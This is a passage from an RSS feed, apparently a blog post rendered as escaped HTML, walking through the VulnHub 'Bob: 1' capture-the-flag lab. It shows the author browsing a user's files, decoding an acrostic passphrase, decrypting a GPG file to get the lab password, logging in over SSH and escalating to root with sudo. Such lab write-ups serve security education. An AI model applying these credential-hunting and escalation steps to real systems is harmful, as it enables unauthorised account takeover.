-seb@debian-Lab:/home/bob/Documents&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-total 20
-drwxr-xr-x  3 bob bob 4096 Mar  5 01:02 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x 18 bob bob 4096 Mar  5 04:53 ..
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 bob bob   91 Mar  5 00:58 login.txt.gpg
-drwxr-xr-x  3 bob bob 4096 Mar  5 00:35 Secret
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 bob bob  300 Mar  4 14:11 staff.txt
-
-seb@debian-Lab:/home/bob/Documents&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;less staff.txt
-Seb:
-
-Seems to like Elliot
-Wants to &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;well at his job
-Gave me a backdoored FTP to instal that apparently Elliot gave him
-
-James:
-
-Does nothing
-Pretty Lazy
-Doesn&lt;span class=&quot;s1&quot;&gt;'t give a shit about his job
-
-Elliot:
-
-Keeps to himself
-Always needs to challenge everything I do
-Keep an eye on him
-Try and get him fired&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Seems like James was the only sane member of this group :D&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;seb@debian-Lab:/home/bob/Documents&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Secret/
-seb@debian-Lab:/home/bob/Documents/Secret&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-total 12
-drwxr-xr-x 3 bob bob 4096 Mar  5 00:35 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x 3 bob bob 4096 Mar  5 01:02 ..
-drwxr-xr-x 4 bob bob 4096 Mar  5 00:39 Keep_Out
-seb@debian-Lab:/home/bob/Documents/Secret&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Keep_Out/
-seb@debian-Lab:/home/bob/Documents/Secret/Keep_Out&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-total 16
-drwxr-xr-x 4 bob bob 4096 Mar  5 00:39 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x 3 bob bob 4096 Mar  5 00:35 ..
-drwxr-xr-x 3 bob bob 4096 Mar  5 04:43 Not_Porn
-drwxr-xr-x 2 bob bob 4096 Mar  5 00:39 Porn
-seb@debian-Lab:/home/bob/Documents/Secret/Keep_Out&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Not_Porn/
-seb@debian-Lab:/home/bob/Documents/Secret/Keep_Out/Not_Porn&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-total 12
-drwxr-xr-x 3 bob bob 4096 Mar  5 04:43 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x 4 bob bob 4096 Mar  5 00:39 ..
-drwxr-xr-x 2 bob bob 4096 Mar  5 00:50 No_Lookie_In_Here
-seb@debian-Lab:/home/bob/Documents/Secret/Keep_Out/Not_Porn&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;No_Lookie_In_Here/
-seb@debian-Lab:/home/bob/Documents/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-total 12
-drwxr-xr-x 2 bob bob 4096 Mar  5 00:50 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x 3 bob bob 4096 Mar  5 04:43 ..
-&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 bob bob  438 Mar  5 00:50 notes.sh
-seb@debian-Lab:/home/bob/Documents/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;less notes.sh
-&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
-clear
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;-= Notes =-&quot;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Harry Potter is my faviorite&quot;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Are you the real me?&quot;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Right, I'm ordering pizza this is going nowhere&quot;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;People just don't get me&quot;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh &amp;lt;sea santy here&amp;gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Cucumber&quot;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Rest now your eyes are sleepy&quot;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Are you gonna stop reading this yet?&quot;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Time to fix the server&quot;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Everyone is annoying&quot;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Sticky notes gotta buy em&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;What’s that!? Let’s leave this for later and copy previously noticed &lt;code class=&quot;highlighter-rouge&quot;&gt;login.txt.gpg&lt;/code&gt; file.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# scp &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; 25468 jc@10.0.2.4:/home/bob/Documents/login.txt.gpg ~
-  __  __ _ _ _                        _____                          
- |  &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | |                      / ____|                         
- | &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; / |_| | |__  _   _ _ __ __ _  | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;___   ___ _ ____   _____ _ __
- | |&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;| | | | &lt;span class=&quot;s1&quot;&gt;'_ \| | | | '&lt;/span&gt;__/ _&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; |  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ _ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'__\ \ / / _ \ '&lt;/span&gt;__|
- | |  | | | | |_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | |_| | | | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_| |  ____&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; |  __/ |   &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;V /  __/ |   
- |_|  |_|_|_|_.__/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_,_|_|  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_, | |_____/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|_|    &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|_|   
-                              __/ |                                  
-                             |___/                                   
-
-
-jc@10.0.2.4&lt;span class=&quot;s1&quot;&gt;'s password:
-login.txt.gpg                                 100%   91    62.0KB/s   00:00&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;But of course we’re going to need a pasword in order to decrypt the login. That’s when I started looking at all my previous notes but none of the guesses worked. And here comes the &lt;code class=&quot;highlighter-rouge&quot;&gt;notes.sh&lt;/code&gt; and the first letters of each sentence - &lt;code class=&quot;highlighter-rouge&quot;&gt;HARPOCRATES&lt;/code&gt;. That’s the password.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# gpg &lt;span class=&quot;nt&quot;&gt;--decrypt&lt;/span&gt; login.txt.gpg &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; login.txt
-gpg: keybox &lt;span class=&quot;s1&quot;&gt;'/root/.gnupg/pubring.kbx'&lt;/span&gt; created
-gpg: AES encrypted data
-gpg: encrypted with 1 passphrase
-root@kali:~# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;login.txt
-bob:b0bcat_&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Now, we can login into Bob’s account.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ssh bob@10.0.2.4 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 25468
-  __  __ _ _ _                        _____                          
- |  &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | |                      / ____|                         
- | &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; / |_| | |__  _   _ _ __ __ _  | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;___   ___ _ ____   _____ _ __
- | |&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;| | | | &lt;span class=&quot;s1&quot;&gt;'_ \| | | | '&lt;/span&gt;__/ _&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; |  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ _ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'__\ \ / / _ \ '&lt;/span&gt;__|
- | |  | | | | |_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | |_| | | | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_| |  ____&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; |  __/ |   &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;V /  __/ |   
- |_|  |_|_|_|_.__/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_,_|_|  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_, | |_____/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|_|    &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|_|   
-                              __/ |                                  
-                             |___/                                   
-
-
-bob@10.0.2.4&lt;span class=&quot;s1&quot;&gt;'s password:
-Linux debian-Lab 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Mon Mar  5 04:48:32 2018 from 192.168.56.1
-bob@debian-Lab:~$&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;And of course, as he’s admin, we can change our privilages into the root.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;bob@debian-Lab:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;bob:
-Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;bob on debian-Lab:
-    env_reset, mail_badpass,
-    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin
-
-User bob may run the following commands on debian-Lab:
-    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL : ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ALL
-
-
-bob@debian-Lab:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;su
-root@debian-Lab:/home/bob# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /flag.txt
-CONGRATS ON GAINING ROOT
-
-        .-.
-       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-        |~|       _.--._
-        |~|~:&lt;span class=&quot;s1&quot;&gt;'--~'&lt;/span&gt;      |
-        | | :   &lt;span class=&quot;c&quot;&gt;#root   |&lt;/span&gt;
-        | | :     _.--._|
-        |~|~&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'--~'&lt;/span&gt;
-        | |
-        | |
-        | |
-        | |
-        | |
-        | |
-        | |
-        | |
-        | |
-   _____|_|_________ Thanks &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;playing ~c0rruptedb1t&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-</description>
-        <pubDate>Sun, 18 Mar 2018 01:00:00 +0100</pubDate>
-        <link>http://localhost:4000/vulnhub-bob-1/</link>
-        <guid isPermaLink="true">http://localhost:4000/vulnhub-bob-1/</guid>
       </item>
     
   </channel>
